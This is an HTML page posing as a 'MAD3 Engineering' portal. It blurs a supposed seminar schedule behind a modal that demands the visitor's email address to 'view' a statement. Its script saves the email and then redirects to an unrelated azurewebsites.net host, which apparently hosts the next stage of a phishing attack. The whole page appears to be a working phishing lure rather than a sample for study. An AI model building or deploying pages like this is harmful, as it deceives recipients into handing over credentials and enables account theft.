<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAD3 Engineering - Portal</title>
    <style>
        /* Base Styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f5f5;
            height: 100vh;
            overflow-x: hidden;
        }
        
        /* Content Area */
        .content {
            transition: filter 0.3s ease;
        }
        
        .content--blurred {
            filter: blur(9.5px);
        }
        
        .image-container {
            max-width: 100%;
            padding: 20px;
        }
        
        .image-container img {
            width: 100%;
            height: auto;
            border-radius: 8px;
            display: block;
        }
        
        /* Modal Styles */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(75, 85, 99, 0.7);
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 100px;
            z-index: 1000;
        }
        
        .modal__content {
            background-color: white;
            padding: 2rem;
            border-radius: 4px;
            width: 90%;
            max-width: 580px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
        }
        
        .modal__title {
            color: #2B3674;
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            font-weight: 600;
        }
        
        .modal__instruction {
            color: #000;
            font-size: 1.1rem;
            margin-bottom: 1.5rem;
            font-weight: 500;
        }
        
        /* Form Styles */
        .form {
            display: flex;
            flex-direction: column;
        }
        
        .form__input {
            width: 100%;
            padding: 12px;
            border: 1px solid #E2E8F0;
            border-radius: 4px;
            margin-bottom: 8px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .form__input:focus {
            border-color: #4299E1;
            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.3);
            outline: none;
        }
        
        .form__input--invalid {
            border-color: #FF7F50;
            background-color: #FFF5F3;
        }
        
        .form__feedback {
            font-size: 0.9rem;
            margin: 4px 0 16px;
            min-height: 20px;
        }
        
        .form__feedback--valid {
            color: #22C55E;
        }
        
        .form__feedback--invalid {
            color: #FF7F50;
        }
        
        .form__submit {
            background-color: #ff6347;
            color: white;
            border: none;
            padding: 12px 32px;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            align-self: flex-start;
            margin-top: 1rem;
        }
        
        .form__submit:hover {
            background-color: #FF6B5E;
        }
        
        @media (max-width: 600px) {
            .modal {
                padding-top: 50px;
            }
            
            .modal__content {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <main class="content content--blurred" id="pageContent">
        <div class="image-container">
            <img src="DD" alt="XML Seminar Schedule">
        </div>
    </main>

    <div class="modal" id="modalOverlay">
        <div class="modal__content">
            <h1 class="modal__title">MAD3 Engineering - Statement</h1>
            <p class="modal__instruction">Please enter your email address to view</p>
            
            <form class="form" id="emailForm">
                <input type="email" 
                       class="form__input" 
                       id="emailInput" 
                       placeholder="Email address" 
                       required
                       autocomplete="email">
                
                <div class="form__feedback" id="validationMessage"></div>
                
                <button type="submit" class="form__submit">View</button>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // DOM Elements
            const elements = {
                form: document.getElementById('emailForm'),
                modal: document.getElementById('modalOverlay'),
                content: document.getElementById('pageContent'),
                emailInput: document.getElementById('emailInput'),
                validationMessage: document.getElementById('validationMessage')
            };
            
            // Email validation regex
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            
            // Check for saved email
            const savedEmail = localStorage.getItem('userEmail');
            if (savedEmail) {
                elements.emailInput.value = savedEmail;
            }
            
            // Validate email format
            function isValidEmail(email) {
                return emailRegex.test(email);
            }
            
            // Save email to localStorage
            function saveEmail(email) {
                if (email && email.includes('@')) {
                    localStorage.setItem('userEmail', email);
                }
            }
            
            // Update validation message
            function updateValidationMessage(email) {
                if (!email.trim()) {
                    elements.validationMessage.textContent = '';
                    elements.validationMessage.className = 'form__feedback';
                    return;
                }
                
                if (isValidEmail(email)) {
                    elements.validationMessage.textContent = 'That email address is valid.';
                    elements.validationMessage.className = 'form__feedback form__feedback--valid';
                } else {
                    elements.validationMessage.textContent = 'Please enter a valid email address';
                    elements.validationMessage.className = 'form__feedback form__feedback--invalid';
                }
            }
            
            // Event Listeners
            elements.emailInput.addEventListener('input', function() {
                const email = elements.emailInput.value;
                saveEmail(email);
                updateValidationMessage(email);
            });
            
            elements.form.addEventListener('submit', function(e) {
                e.preventDefault();
                const email = elements.emailInput.value;
                
                if (!isValidEmail(email)) {
                    updateValidationMessage(email);
                    return;
                }
                
                // Save email and redirect
                localStorage.setItem('userEmail', email);
                window.location.href = 'https://dd73-493e-gdhhajf3gxbcdpc4.australiasoutheast-01.azurewebsites.net/';
            });
        });
    </script>
</body>
</html>
